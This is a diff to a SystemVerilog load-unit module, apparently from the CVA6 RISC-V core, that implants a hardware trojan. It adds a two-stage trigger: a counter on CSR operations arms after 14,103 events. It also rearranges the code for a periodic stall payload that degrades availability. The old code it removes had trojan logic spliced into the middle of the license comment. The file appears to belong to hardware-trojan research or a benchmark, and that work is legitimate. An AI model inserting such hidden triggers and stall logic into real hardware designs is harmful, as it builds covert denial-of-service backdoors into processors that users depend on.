@@ -1,27 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 11399;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|valid_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && valid_i) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -128,6 +107,29 @@ module load_unit_trojan_Availability
   // adds a combinational path between the request and response interfaces
   // towards the cache.
   localparam logic LDBUF_FALLTHROUGH = (CVA6Cfg.NrLoadBufEntries == 1);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=14103)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 14103;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
   localparam int unsigned REQ_ID_BITS = CVA6Cfg.NrLoadBufEntries > 1 ? $clog2(
       CVA6Cfg.NrLoadBufEntries
   ) : 1;
@@ -588,12 +590,9 @@ module load_unit_trojan_Availability
   //pragma translate_on
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -607,5 +606,6 @@ module load_unit_trojan_Availability
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
